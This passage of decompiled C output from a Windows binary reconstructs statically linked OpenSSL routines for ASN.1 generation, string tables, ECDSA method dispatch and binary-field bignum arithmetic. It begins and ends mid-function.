  int v10; // eax
  _DWORD *v11; // eax
  void *v12; // eax
  int v13; // [esp+Ch] [ebp-10h] BYREF
  int v14[3]; // [esp+10h] [ebp-Ch] BYREF

  v3 = v2;
  v4 = (unsigned int *)sub_42C600();
  if ( !v4 )
  {
    sub_408310(13, 179, 65, (int)"crypto\\asn1\\asn1_gen.c", 587);
    return 0;
  }
  if ( !v3 )
    v3 = byte_4F1291;
  switch ( a2 )
  {
    case 1u:
      if ( a1 == 1 )
      {
        v14[1] = 0;
        v14[0] = 0;
        v14[2] = (int)v3;
        if ( sub_44D2D0((int)v14, v4 + 1) )
          goto LABEL_44;
        sub_408310(13, 179, 176, (int)"crypto\\asn1\\asn1_gen.c", 612);
        goto LABEL_53;
      }
      sub_408310(13, 179, 190, (int)"crypto\\asn1\\asn1_gen.c", 605);
      sub_42C610((int)v4);
      return 0;
    case 2u:
    case 0xAu:
      if ( a1 == 1 )
      {
        v6 = sub_44D140(0, v3);
        v4[1] = (unsigned int)v6;
        if ( v6 )
          goto LABEL_44;
        sub_408310(13, 179, 180, (int)"crypto\\asn1\\asn1_gen.c", 625);
        goto LABEL_53;
      }
      sub_408310(13, 179, 185, (int)"crypto\\asn1\\asn1_gen.c", 620);
      sub_42C610((int)v4);
      return 0;
    case 3u:
    case 4u:
      v11 = sub_432DC0();
      v4[1] = (unsigned int)v11;
      if ( !v11 )
      {
        sub_408310(13, 179, 65, (int)"crypto\\asn1\\asn1_gen.c", 692);
        sub_42C610((int)v4);
        return 0;
      }
      if ( a1 == 3 )
      {
        v12 = sub_424A20(v3, &v13);
        if ( !v12 )
        {
          sub_408310(13, 179, 178, (int)"crypto\\asn1\\asn1_gen.c", 698);
          goto LABEL_53;
        }
        *(_DWORD *)(v4[1] + 8) = v12;
        *(_DWORD *)v4[1] = v13;
        *(_DWORD *)(v4[1] + 4) = a2;
        goto LABEL_42;
      }
      if ( a1 == 1 )
      {
        sub_432910((int)v11, v3, -1);
LABEL_42:
        if ( a2 == 3 )
        {
          *(_DWORD *)(v4[1] + 12) &= 0xFFFFFFF0;
          *(_DWORD *)(v4[1] + 12) |= 8u;
        }
        goto LABEL_44;
      }
      if ( a1 == 4 && a2 == 3 )
      {
        if ( sub_441130(v3, 44, 1, (int (__cdecl *)(char *, int, int))sub_47E7C0, (int)v11) )
          goto LABEL_44;
        sub_408310(13, 179, 188, (int)"crypto\\asn1\\asn1_gen.c", 710);
LABEL_53:
        sub_408610(2, "string=", v3);
        sub_42C610((int)v4);
        return 0;
      }
      else
      {
        sub_408310(13, 179, 175, (int)"crypto\\asn1\\asn1_gen.c", 716);
        sub_42C610((int)v4);
        return 0;
      }
    case 5u:
      if ( !v3 || !*v3 )
        goto LABEL_44;
      sub_408310(13, 179, 182, (int)"crypto\\asn1\\asn1_gen.c", 598);
      sub_42C610((int)v4);
      return 0;
    case 6u:
      if ( a1 != 1 )
      {
        sub_408310(13, 179, 191, (int)"crypto\\asn1\\asn1_gen.c", 632);
        sub_42C610((int)v4);
        return 0;
      }
      v7 = sub_423C60(v3, 0);
      v4[1] = (unsigned int)v7;
      if ( v7 )
        goto LABEL_44;
      sub_408310(13, 179, 183, (int)"crypto\\asn1\\asn1_gen.c", 636);
      goto LABEL_53;
    case 0xCu:
    case 0x12u:
    case 0x13u:
    case 0x14u:
    case 0x16u:
    case 0x1Au:
    case 0x1Bu:
    case 0x1Cu:
    case 0x1Eu:
      if ( a1 == 1 )
      {
        v9 = 4097;
      }
      else
      {
        if ( a1 != 2 )
        {
          sub_408310(13, 179, 177, (int)"crypto\\asn1\\asn1_gen.c", 677);
          sub_42C610((int)v4);
          return 0;
        }
        v9 = 4096;
      }
      v10 = sub_42D2F0(a2);
      if ( sub_4724F0((int *)v4 + 1, v3, -1, v9, v10) > 0 )
        goto LABEL_44;
      sub_408310(13, 179, 65, (int)"crypto\\asn1\\asn1_gen.c", 683);
      goto LABEL_53;
    case 0x17u:
    case 0x18u:
      if ( a1 != 1 )
      {
        sub_408310(13, 179, 193, (int)"crypto\\asn1\\asn1_gen.c", 644);
        sub_42C610((int)v4);
        return 0;
      }
      v8 = sub_432DC0();
      v4[1] = (unsigned int)v8;
      if ( !v8 )
      {
        sub_408310(13, 179, 65, (int)"crypto\\asn1\\asn1_gen.c", 648);
        goto LABEL_53;
      }
      if ( !sub_432910((int)v8, v3, -1) )
      {
        sub_408310(13, 179, 65, (int)"crypto\\asn1\\asn1_gen.c", 652);
        goto LABEL_53;
      }
      *(_DWORD *)(v4[1] + 4) = a2;
      if ( !sub_430EE0((int *)v4[1]) )
      {
        sub_408310(13, 179, 184, (int)"crypto\\asn1\\asn1_gen.c", 657);
        goto LABEL_53;
      }
LABEL_44:
      *v4 = a2;
      return v4;
    default:
      sub_408310(13, 179, 196, (int)"crypto\\asn1\\asn1_gen.c", 729);
      goto LABEL_53;
  }
}
// 47EC01: variable 'v2' is possibly undefined

//----- (0047F090) --------------------------------------------------------
unsigned int *__fastcall sub_47F090(char *a1, _DWORD *a2, int a3, int a4)
{
  void *v4; // ebx
  unsigned int *result; // eax
  int v7; // esi
  signed int v8; // edi
  char v9; // al
  int v10; // esi
  int v11; // ebp
  int *i; // edi
  void *v13; // eax
  int v14; // ebp
  int *v15; // edi
  int v16; // edx
  int v17; // [esp-8h] [ebp-1E8h]
  int v18; // [esp-4h] [ebp-1E4h]
  void *v19; // [esp+10h] [ebp-1D0h] BYREF
  void *Block; // [esp+14h] [ebp-1CCh] BYREF
  int v21; // [esp+18h] [ebp-1C8h] BYREF
  int v22; // [esp+1Ch] [ebp-1C4h]
  void *Src; // [esp+20h] [ebp-1C0h] BYREF
  size_t Size; // [esp+24h] [ebp-1BCh]
  int v25; // [esp+28h] [ebp-1B8h]
  void *v26; // [esp+2Ch] [ebp-1B4h] BYREF
  int v27; // [esp+30h] [ebp-1B0h] BYREF
  int v28; // [esp+34h] [ebp-1ACh] BYREF
  int v29; // [esp+38h] [ebp-1A8h] BYREF
  int v30; // [esp+3Ch] [ebp-1A4h]
  unsigned int v31; // [esp+40h] [ebp-1A0h]
  int v32; // [esp+44h] [ebp-19Ch]
  int v33; // [esp+48h] [ebp-198h]
  char v34; // [esp+5Ch] [ebp-184h] BYREF
  int v35; // [esp+1DCh] [ebp-4h]

  v29 = -1;
  v30 = -1;
  v4 = 0;
  Block = 0;
  v21 = 0;
  v22 = 0;
  v32 = 1;
  v35 = 0;
  if ( sub_441130(a1, 44, 1, (int (__cdecl *)(char *, int, int))sub_47E8F0, (int)&v29) )
  {
    *a2 = 194;
    return 0;
  }
  if ( v31 == 16 || v31 == 17 )
  {
    if ( !a3 )
    {
      *a2 = 192;
      return 0;
    }
    if ( a4 >= 50 )
    {
      *a2 = 181;
      return 0;
    }
    result = (unsigned int *)sub_47F360(v31, v33, a3, a4);
  }
  else
  {
    result = sub_47EBF0(v32, v31);
  }
  v7 = (int)result;
  if ( !result )
    return 0;
  if ( v29 != -1 || v35 )
  {
    v8 = sub_42C5E0((int)result, &Block);
    Size = v8;
    sub_42C610(v7);
    v25 = 0;
    Src = Block;
    if ( v29 == -1 )
    {
      v10 = v8;
    }
    else
    {
      v9 = sub_432B70((_BYTE **)&Src, (unsigned int *)&v21, &v28, &v27, v8);
      if ( v9 < 0 )
      {
LABEL_38:
        sub_413490(Block);
        sub_413490(v4);
        return (unsigned int *)v25;
      }
      Size = (_BYTE *)Block - (_BYTE *)Src + v8;
      if ( (v9 & 1) != 0 )
      {
        v22 = 2;
        v21 = 0;
      }
      else
      {
        v22 = v9 & 0x20;
      }
      v10 = sub_4328B0(0, v21, v29);
    }
    v11 = 0;
    for ( i = &v29 + 5 * v35; v11 < v35; v10 = sub_4328B0(0, v17, v18) )
    {
      v18 = *i;
      v17 = i[3] + v10;
      i[4] = v17;
      ++v11;
      i -= 5;
    }
    v13 = sub_4133F0(v10);
    v4 = v13;
    if ( v13 )
    {
      v14 = 0;
      v19 = v13;
      if ( v35 > 0 )
      {
        v15 = (int *)&v34;
        do
        {
          sub_432CA0((_BYTE **)&v19, *(v15 - 2), *v15, *(v15 - 4), *(v15 - 3));
          if ( *(v15 - 1) )
          {
            *(_BYTE *)v19 = 0;
            v19 = (char *)v19 + 1;
          }
          ++v14;
          v15 += 5;
        }
        while ( v14 < v35 );
      }
      if ( v29 != -1 )
      {
        if ( !v30 && (v29 == 16 || v29 == 17) )
          v16 = 32;
        else
          v16 = v22;
        sub_432CA0((_BYTE **)&v19, v16, v21, v29, v30);
      }
      memcpy(v19, Src, Size);
      v26 = v4;
      v25 = sub_42C5C0(0, &v26, v10);
    }
    goto LABEL_38;
  }
  return result;
}

//----- (0047F360) --------------------------------------------------------
int __cdecl sub_47F360(int a1, int a2, int a3, int a4)
{
  int v4; // esi
  int *v5; // edi
  int *v6; // ebp
  int v7; // eax
  int v8; // eax
  signed int v9; // eax
  signed int v10; // esi
  _DWORD *v11; // eax
  int v12; // edx
  void *Block; // [esp+Ch] [ebp-Ch] BYREF
  int v15; // [esp+10h] [ebp-8h]
  int *v16; // [esp+14h] [ebp-4h]

  v4 = 0;
  v15 = 0;
  v5 = 0;
  Block = 0;
  v6 = sub_426AF0();
  v16 = v6;
  if ( v6 )
  {
    if ( !a2 )
      goto LABEL_10;
    if ( !a3 )
      goto LABEL_18;
    v7 = sub_44DE80(a3);
    v5 = (int *)v7;
    if ( !v7 )
      goto LABEL_18;
    if ( sub_426A30(v7) > 0 )
    {
      while ( 1 )
      {
        sub_426A40(v5, v4);
        v8 = sub_47F090(a3, a4 + 1);
        if ( !v8 || !sub_4269B0(v16, v8) )
          break;
        if ( ++v4 >= sub_426A30((int)v5) )
        {
          v6 = v16;
          goto LABEL_10;
        }
      }
      v6 = v16;
    }
    else
    {
LABEL_10:
      if ( a1 == 17 )
        v9 = sub_42C6B0((int)v6, &Block);
      else
        v9 = sub_42C690((int)v6, &Block);
      v10 = v9;
      if ( v9 >= 0 )
      {
        v15 = sub_42C600();
        if ( v15 )
        {
          v11 = sub_4329F0(a1);
          v12 = v15;
          *(_DWORD *)(v15 + 4) = v11;
          if ( v11 )
          {
            *(_DWORD *)v12 = a1;
            v11[2] = Block;
            **(_DWORD **)(v12 + 4) = v10;
            Block = 0;
          }
        }
      }
    }
  }
LABEL_18:
  sub_413490(Block);
  sub_426C00(v6, sub_42C610);
  sub_44DEC0(a3, (int)v5);
  return v15;
}
// 47F090: using guessed type _DWORD __cdecl sub_47F090(_DWORD, _DWORD);

//----- (0047F4C0) --------------------------------------------------------
unsigned int *__cdecl sub_47F4C0(char *a1, int a2)
{
  unsigned int *v2; // esi
  int v4; // [esp+4h] [ebp-4h] BYREF

  v4 = 0;
  v2 = sub_47F090(a1, &v4, a2, 0);
  if ( v4 )
    sub_408310(13, 178, v4, (int)"crypto\\asn1\\asn1_gen.c", 94);
  return v2;
}

//----- (0047F510) --------------------------------------------------------
int __cdecl sub_47F510(unsigned __int8 *a1, int a2)
{
  int v2; // edx
  int v3; // edi
  int v4; // esi
  unsigned __int8 *v5; // ecx
  unsigned __int8 v6; // al
  int result; // eax

  v2 = a2;
  v3 = 0;
  v4 = 0;
  if ( a2 <= 0 )
    v2 = -1;
  v5 = a1;
  if ( !a1 )
    return 19;
  v6 = *a1;
  if ( !*a1 )
    return 19;
  do
  {
    if ( !v2-- )
      break;
    ++v5;
    if ( (v6 < 0x61u || v6 > 0x7Au)
      && (v6 < 0x41u || v6 > 0x5Au)
      && (v6 < 0x30u || v6 > 0x39u)
      && v6 != 32
      && v6 != 39
      && v6 != 40
      && v6 != 41
      && v6 != 43
      && v6 != 44
      && v6 != 45
      && v6 != 46
      && v6 != 47
      && v6 != 58
      && v6 != 61
      && v6 != 63 )
    {
      v3 = 1;
    }
    if ( (v6 & 0x80u) != 0 )
      v4 = 1;
    v6 = *v5;
  }
  while ( *v5 );
  if ( v4 )
    return 20;
  result = 22;
  if ( !v3 )
    return 19;
  return result;
}

//----- (0047F5D0) --------------------------------------------------------
int __cdecl sub_47F5D0(int a1, int *a2)
{
  int v3; // ebp
  int v4; // ecx
  int v5; // esi
  char v6; // al
  char v7[80]; // [esp+8h] [ebp-54h] BYREF

  if ( !a2 )
    return 0;
  v3 = a2[2];
  v4 = 0;
  v5 = 0;
  if ( *a2 > 0 )
  {
    do
    {
      v6 = *(_BYTE *)(v5 + v3);
      if ( v6 != 127 && (v6 >= 32 || v6 == 10 || v6 == 13) )
        v7[v4] = v6;
      else
        v7[v4] = 46;
      if ( ++v4 >= 80 )
      {
        if ( sub_405110(a1, (int)v7, v4) <= 0 )
          return 0;
        v4 = 0;
      }
      ++v5;
    }
    while ( v5 < *a2 );
    if ( v4 > 0 && sub_405110(a1, (int)v7, v4) <= 0 )
      return 0;
  }
  return 1;
}
// 47F5D0: using guessed type char var_54[80];

//----- (0047F6A0) --------------------------------------------------------
int __cdecl sub_47F6A0(int a1)
{
  int v1; // eax
  int v3[5]; // [esp+0h] [ebp-14h] BYREF

  v3[0] = a1;
  if ( dword_539340 && (v1 = sub_426BE0((int)dword_539340, (int)v3), v1 >= 0) )
    return sub_426A40((int *)dword_539340, v1);
  else
    return sub_423650((int)v3, (int)"\r", 23, 20, (int (__cdecl *)(int, int))sub_42AC20);
}

//----- (0047F700) --------------------------------------------------------
_DWORD *__cdecl sub_47F700(int a1)
{
  _DWORD *result; // eax
  _DWORD *v2; // edi
  _DWORD *v3; // eax
  _DWORD *v4; // esi

  if ( dword_539340 || (result = sub_426860((int)sub_443940), (dword_539340 = result) != 0) )
  {
    result = (_DWORD *)sub_47F6A0(a1);
    v2 = result;
    if ( !result || (result[4] & 1) == 0 )
    {
      v3 = sub_413430(0x14u);
      v4 = v3;
      if ( !v3 )
        return 0;
      if ( !sub_4269B0((int *)dword_539340, (int)v3) )
      {
        sub_413490(v4);
        return 0;
      }
      if ( v2 )
      {
        *v4 = *v2;
        v4[1] = v2[1];
        v4[2] = v2[2];
        v4[3] = v2[3];
        v4[4] = v2[4] | 1;
      }
      else
      {
        v4[1] = -1;
        v4[2] = -1;
        v4[4] = 1;
      }
      return v4;
    }
  }
  return result;
}
// 443940: using guessed type int sub_443940();

//----- (0047F7C0) --------------------------------------------------------
int __cdecl sub_47F7C0(int a1, int a2, int a3, int a4, int a5)
{
  _DWORD *v5; // eax

  v5 = sub_47F700(a1);
  if ( v5 )
  {
    if ( a2 >= 0 )
      v5[1] = a2;
    if ( a3 >= 0 )
      v5[2] = a3;
    if ( a4 )
      v5[3] = a4;
    if ( a5 )
      v5[4] = a5 | 1;
    return 1;
  }
  else
  {
    sub_408310(13, 129, 65, "crypto\\asn1\\a_strnid.c", 230);
    return 0;
  }
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0047F830) --------------------------------------------------------
void __cdecl sub_47F830(void *Block)
{
  if ( (*((_BYTE *)Block + 16) & 1) != 0 )
    sub_413490(Block);
}

//----- (0047F850) --------------------------------------------------------
int __cdecl sub_47F850(int *a1, char *a2, signed int Size, int a4, int a5)
{
  int *v5; // esi
  int v6; // eax
  int v7; // ecx
  int v8; // eax
  int v10; // [esp+4h] [ebp-4h] BYREF

  v5 = a1;
  v10 = 0;
  if ( !a1 )
    v5 = &v10;
  v6 = sub_47F6A0(a5);
  if ( v6 )
  {
    v7 = *(_DWORD *)(v6 + 12);
    if ( (*(_BYTE *)(v6 + 16) & 2) == 0 )
      v7 &= dword_535588;
    v8 = sub_4720D0(v5, a2, Size, a4, v7, *(_DWORD *)(v6 + 4), *(_DWORD *)(v6 + 8));
  }
  else
  {
    v8 = sub_4724F0(v5, a2, Size, a4, dword_535588 & 0x2806);
  }
  if ( v8 > 0 )
    return *v5;
  else
    return 0;
}
// 535588: using guessed type int dword_535588;

//----- (0047F8F0) --------------------------------------------------------
void sub_47F8F0()
{
  void *v0; // [esp-8h] [ebp-8h]

  if ( dword_539340 )
  {
    v0 = dword_539340;
    dword_539340 = 0;
    sub_426C00(v0, (void (__cdecl *)(_DWORD))sub_47F830);
  }
}

//----- (0047F920) --------------------------------------------------------
void *sub_47F920()
{
  return &unk_524AA4;
}

//----- (0047F930) --------------------------------------------------------
void *sub_47F930()
{
  return &unk_524AE8;
}

//----- (0047F940) --------------------------------------------------------
int sub_47F940()
{
  return sub_42FB20((int)&unk_524AE8);
}

//----- (0047F950) --------------------------------------------------------
void __cdecl sub_47F950(int a1)
{
  sub_42FEF0(a1, (int)&unk_524AE8);
}

//----- (0047F970) --------------------------------------------------------
void *sub_47F970()
{
  return &unk_524DFC;
}

//----- (0047F980) --------------------------------------------------------
void *sub_47F980()
{
  return &unk_524E68;
}

//----- (0047F990) --------------------------------------------------------
void *sub_47F990()
{
  return &unk_524EAC;
}

//----- (0047F9A0) --------------------------------------------------------
void *sub_47F9A0()
{
  return &unk_524F18;
}

//----- (0047F9B0) --------------------------------------------------------
void *sub_47F9B0()
{
  return &unk_524FA0;
}

//----- (0047F9C0) --------------------------------------------------------
void *sub_47F9C0()
{
  return &unk_525028;
}

//----- (0047F9D0) --------------------------------------------------------
void *sub_47F9D0()
{
  return &unk_52506C;
}

//----- (0047F9E0) --------------------------------------------------------
void *sub_47F9E0()
{
  return &unk_5250C4;
}

//----- (0047F9F0) --------------------------------------------------------
void *sub_47F9F0()
{
  return &unk_525144;
}

//----- (0047FA00) --------------------------------------------------------
void *sub_47FA00()
{
  return &unk_5251C4;
}

//----- (0047FA10) --------------------------------------------------------
void *sub_47FA10()
{
  return &unk_525288;
}

//----- (0047FA20) --------------------------------------------------------
void *sub_47FA20()
{
  return &unk_5252CC;
}

//----- (0047FA30) --------------------------------------------------------
void __cdecl sub_47FA30(void *Block)
{
  if ( Block )
  {
    sub_422B70(*((void ***)Block + 1));
    if ( (*(_BYTE *)Block & 4) == 0 )
      sub_426C00(*((void **)Block + 2), sub_47D220);
    sub_426C00(*((void **)Block + 3), (void (__cdecl *)(_DWORD))sub_422B70);
    sub_413490(Block);
  }
}

//----- (0047FA80) --------------------------------------------------------
int __cdecl sub_47FA80(int a1, int a2, char a3)
{
  int result; // eax

  sub_44FC10(a2, -1, 0);
  if ( (a3 & 4) != 0 )
    return 3;
  result = 1;
  if ( (*(_DWORD *)(a2 + 112) & 0x2000) == 0 )
    return 3;
  return result;
}

//----- (0047FAB0) --------------------------------------------------------
int __cdecl sub_47FAB0(int a1, int a2, char a3)
{
  int v3; // esi
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // edi
  int v8; // eax
  int v9; // eax
  int result; // eax

  v3 = *(_DWORD *)(a2 + 180);
  if ( !v3 )
    goto LABEL_22;
  if ( *(_DWORD *)(v3 + 4) )
  {
    v4 = 0;
    if ( sub_426A30(*(_DWORD *)(v3 + 4)) > 0 )
    {
      do
      {
        v5 = sub_426A40(*(int **)(v3 + 4), v4);
        v6 = sub_423680(v5);
        if ( v6 == a1 || v6 == 910 && (a3 & 0x10) != 0 )
          return 2;
      }
      while ( ++v4 < sub_426A30(*(_DWORD *)(v3 + 4)) );
    }
  }
  if ( *(_DWORD *)v3 )
  {
    v7 = 0;
    if ( sub_426A30(*(_DWORD *)v3) <= 0 )
      return 2;
    while ( 1 )
    {
      v8 = sub_426A40(*(int **)v3, v7);
      v9 = sub_423680(v8);
      if ( v9 == a1 || v9 == 910 && (a3 & 0x10) != 0 )
        break;
      if ( ++v7 >= sub_426A30(*(_DWORD *)v3) )
        return 2;
    }
    return 1;
  }
  else
  {
LABEL_22:
    if ( (a3 & 8) == 0 )
      return 3;
    sub_44FC10(a2, -1, 0);
    if ( (a3 & 4) != 0 )
      return 3;
    result = 1;
    if ( (*(_DWORD *)(a2 + 112) & 0x2000) == 0 )
      return 3;
  }
  return result;
}

//----- (0047FBB0) --------------------------------------------------------
int __cdecl sub_47FBB0(int a1, int a2, char a3)
{
  return sub_47FAB0(*(_DWORD *)(a1 + 16), a2, a3 | 0x18);
}

//----- (0047FBD0) --------------------------------------------------------
int __cdecl sub_47FBD0(int a1, int a2, char a3)
{
  return sub_47FAB0(*(_DWORD *)(a1 + 16), a2, a3 & 0xE7);
}

//----- (0047FBF0) --------------------------------------------------------
int __usercall sub_47FBF0@<eax>(__m64 a1@<mm0>, int a2, int *a3, _DWORD *a4)
{
  int *v4; // eax
  int *v5; // edi
  int *v6; // eax
  int *v7; // esi
  _DWORD *v8; // eax
  int v10; // [esp+Ch] [ebp-4h]

  v10 = 0;
  *a4 = 0;
  v4 = sub_420670();
  v5 = v4;
  if ( v4 )
  {
    sub_420700(v4);
    v6 = sub_420790(v5);
    v7 = v6;
    if ( !v6 || !sub_417490(v6, 1) )
      goto LABEL_15;
    if ( sub_4169B0(a3, v7) <= 0 )
      *a4 |= 1u;
    if ( !sub_4173E0(v7, *(_DWORD **)(a2 + 8)) || !sub_438090(v7, 1u) )
      goto LABEL_15;
    if ( sub_4169B0(a3, v7) >= 0 )
      *a4 |= 2u;
    v8 = *(_DWORD **)(a2 + 36);
    if ( v8 )
    {
      if ( !sub_4282A0(a1, v7, a3, v8, *(int **)(a2 + 8), v5) )
      {
LABEL_15:
        sub_420750(v5);
        sub_4206C0((void **)v5);
        return v10;
      }
      if ( !sub_416DC0((int)v7) )
        *a4 |= 4u;
    }
    v10 = 1;
    goto LABEL_15;
  }
  return 0;
}

//----- (0047FCF0) --------------------------------------------------------
void *sub_47FCF0()
{
  return &unk_525524;
}

//----- (0047FD00) --------------------------------------------------------
void __cdecl sub_47FD00(int a1)
{
  sub_42FEF0(a1, (int)&unk_525524);
}

//----- (0047FD20) --------------------------------------------------------
void *sub_47FD20()
{
  return &unk_5255A8;
}

//----- (0047FD30) --------------------------------------------------------
void __cdecl sub_47FD30(int a1)
{
  sub_42FEF0(a1, (int)&unk_5255A8);
}

//----- (0047FD50) --------------------------------------------------------
void *sub_47FD50()
{
  return &unk_5255C4;
}

//----- (0047FD60) --------------------------------------------------------
void __cdecl sub_47FD60(int a1)
{
  sub_42FEF0(a1, (int)&unk_5255C4);
}

//----- (0047FD80) --------------------------------------------------------
int __cdecl sub_47FD80(int a1, int a2, int a3, int a4, int a5)
{
  int (*v5)(void); // eax

  v5 = *(int (**)(void))(*(_DWORD *)a5 + 48);
  if ( v5 )
    return v5();
  sub_408310(16, 251, 152, (int)"crypto\\ec\\ecdsa_sign.c", 25);
  return 0;
}

//----- (0047FDC0) --------------------------------------------------------
int __cdecl sub_47FDC0(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int (__cdecl *v6)(int, int, int, int, int, _DWORD, _DWORD, int); // eax

  v6 = *(int (__cdecl **)(int, int, int, int, int, _DWORD, _DWORD, int))(*(_DWORD *)a6 + 40);
  if ( v6 )
    return v6(a1, a2, a3, a4, a5, 0, 0, a6);
  sub_408310(16, 254, 152, (int)"crypto\\ec\\ecdsa_sign.c", 41);
  return 0;
}

//----- (0047FE10) --------------------------------------------------------
int __cdecl sub_47FE10(int a1, int a2, int a3, int a4)
{
  int (*v4)(void); // eax

  v4 = *(int (**)(void))(*(_DWORD *)a4 + 56);
  if ( v4 )
    return v4();
  sub_408310(16, 252, 152, (int)"crypto\\ec\\ecdsa_vrf.c", 25);
  return 0;
}

//----- (0047FE50) --------------------------------------------------------
int __cdecl sub_47FE50(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int (*v6)(void); // eax

  v6 = *(int (**)(void))(*(_DWORD *)a6 + 52);
  if ( v6 )
    return v6();
  sub_408310(16, 253, 152, (int)"crypto\\ec\\ecdsa_vrf.c", 41);
  return 0;
}

//----- (0047FE90) --------------------------------------------------------
int __cdecl sub_47FE90(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v3; // edi
  _DWORD *v4; // esi
  int result; // eax
  int i; // eax

  v3 = a3;
  if ( a2[1] >= a3[1] )
  {
    v4 = a2;
  }
  else
  {
    v4 = a3;
    v3 = a2;
  }
  result = (int)sub_4173C0((int)a1, v4[1]);
  if ( result )
  {
    for ( i = 0; i < v3[1]; ++i )
      *(_DWORD *)(*a1 + 4 * i) = *(_DWORD *)(*v4 + 4 * i) ^ *(_DWORD *)(*v3 + 4 * i);
    for ( ; i < v4[1]; ++i )
      *(_DWORD *)(*a1 + 4 * i) = *(_DWORD *)(*v4 + 4 * i);
    a1[1] = v4[1];
    sub_416F60(a1);
    return 1;
  }
  return result;
}

//----- (0047FF20) --------------------------------------------------------
int __cdecl sub_47FF20(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v3; // esi
  int result; // eax
  _DWORD *v5; // ebx
  int i; // eax
  _DWORD *v7; // edi
  int v8; // eax
  int v9; // ebp
  bool v10; // zf
  unsigned int v11; // ebx
  _DWORD *v12; // ecx
  int v13; // eax
  int v14; // esi
  _DWORD *v15; // eax
  int v16; // edx
  int v17; // edx
  unsigned int v18; // esi
  int v19; // ebx
  int *v20; // eax
  int v21; // edx
  int v22; // eax
  int v23; // edx
  unsigned int v24; // edx
  _DWORD *v25; // [esp+4h] [ebp-Ch]
  int v26; // [esp+8h] [ebp-8h]
  int v27; // [esp+Ch] [ebp-4h]

  v3 = a3;
  if ( !*a3 )
  {
    sub_417490(a1, 0);
    return 1;
  }
  v5 = a1;
  if ( a2 != a1 )
  {
    result = (int)sub_4173C0((int)a1, a2[1]);
    if ( !result )
      return result;
    for ( i = 0; i < a2[1]; ++i )
      *(_DWORD *)(*a1 + 4 * i) = *(_DWORD *)(*a2 + 4 * i);
    a1[1] = a2[1];
  }
  v7 = (_DWORD *)*a1;
  v8 = *a3 / 32;
  v9 = a1[1] - 1;
  v10 = v9 == v8;
  v26 = v8;
  if ( v9 > v8 )
  {
    v25 = &v7[v9 - v8];
    do
    {
      v11 = v7[v9];
      if ( v11 )
      {
        v12 = v3 + 1;
        v7[v9] = 0;
        v27 = 1;
        if ( v3[1] )
        {
          do
          {
            v13 = *v3 - *v12;
            v14 = v13 % 32;
            v15 = &v7[v9 - v13 / 32];
            *v15 ^= v11 >> v14;
            if ( v14 )
              *(v15 - 1) ^= v11 << (32 - v14);
            v3 = a3;
            v10 = a3[v27 + 1] == 0;
            v12 = &a3[++v27];
          }
          while ( !v10 );
        }
        v16 = *v3 % 32;
        *v25 ^= v11 >> v16;
        if ( v16 )
          *(v25 - 1) ^= v11 << (32 - v16);
        v8 = v26;
      }
      else
      {
        --v9;
        --v25;
      }
      v10 = v9 == v8;
    }
    while ( v9 > v8 );
    v5 = a1;
  }
  if ( v10 )
  {
    while ( 1 )
    {
      v17 = *v3 % 32;
      v18 = v7[v8] >> v17;
      if ( !v18 )
        break;
      if ( v17 )
        v7[v8] = v7[v8] << (32 - v17) >> (32 - v17);
      else
        v7[v8] = 0;
      *v7 ^= v18;
      v19 = 1;
      if ( a3[1] )
      {
        v20 = a3 + 1;
        do
        {
          v21 = *v20;
          v22 = *v20 / 32;
          v23 = v21 % 32;
          v7[v22] ^= v18 << v23;
          if ( v23 )
          {
            v24 = v18 >> (32 - v23);
            if ( v24 )
              v7[v22 + 1] ^= v24;
          }
          v20 = &a3[++v19];
        }
        while ( *v20 );
        v8 = v26;
        v3 = a3;
      }
      else
      {
        v3 = a3;
      }
    }
    v5 = a1;
  }
  sub_416F60(v5);
  return 1;
}

//----- (00480160) --------------------------------------------------------
int __cdecl sub_480160(_DWORD *a1, _DWORD *a2, _DWORD *a3, int *a4)
{
  int v4; // ebp
  _DWORD *v5; // esi
  int v6; // ecx
  int v7; // edx

  v4 = 0;
  sub_420700(a4);
  v5 = sub_420790(a4);
  if ( v5 && sub_4173C0((int)v5, 2 * a2[1]) )
  {
    v6 = a2[1] - 1;
    if ( v6 >= 0 )
    {
      do
      {
        *(_DWORD *)(*v5 + 8 * v6 + 4) = dword_525660[HIWORD(*(_DWORD *)(*a2 + 4 * v6)) & 0xF] | ((dword_525660[(*(_DWORD *)(*a2 + 4 * v6) >> 20) & 0xF] | ((dword_525660[HIBYTE(*(_DWORD *)(*a2 + 4 * v6)) & 0xF] | (dword_525660[*(_DWORD *)(*a2 + 4 * v6) >> 28] << 8)) << 8)) << 8);
        v7 = dword_525660[*(_DWORD *)(*a2 + 4 * v6) & 0xF] | ((dword_525660[(*(_DWORD *)(*a2 + 4 * v6) >> 4) & 0xF] | ((dword_525660[(*(_DWORD *)(*a2 + 4 * v6) >> 8) & 0xF] | (dword_525660[(unsigned __int8)HIBYTE(*(_WORD *)(*a2 + 4 * v6)) >> 4] << 8)) << 8)) << 8);
        --v6;
        *(_DWORD *)(*v5 + 8 * v6 + 8) = v7;
      }
      while ( v6 >= 0 );
      v4 = 0;
    }
    v5[1] = 2 * a2[1];
    sub_416F60(v5);
    if ( sub_47FF20(a1, v5, a3) )
      v4 = 1;
  }
  sub_420750(a4);
  return v4;
}
// 525660: using guessed type int dword_525660[16];

//----- (004802A0) --------------------------------------------------------
int __cdecl sub_4802A0(int a1, int a2, int a3)
{
  _DWORD *v3; // ebx
  int v4; // esi
  int v6; // edx
  int v7; // edi
  unsigned int v8; // eax
  int i; // ecx
  unsigned int v10; // eax
  unsigned int v11; // eax
  unsigned int v12; // eax

  v3 = (_DWORD *)a1;
  v4 = 0;
  if ( sub_416DB0(a1) )
    return 0;
  v6 = *(_DWORD *)(a1 + 4) - 1;
  if ( v6 >= 0 )
  {
    v7 = 32 * v6 - 2;
    do
    {
      if ( *(_DWORD *)(*v3 + 4 * v6) )
      {
        v8 = 0x80000000;
        for ( i = 31; i >= 0; i -= 4 )
        {
          if ( (v8 & *(_DWORD *)(*v3 + 4 * v6)) != 0 )
          {
            if ( v4 < a3 )
            {
              *(_DWORD *)(a2 + 4 * v4) = v7 + i + 2;
              v3 = (_DWORD *)a1;
            }
            ++v4;
          }
          v10 = v8 >> 1;
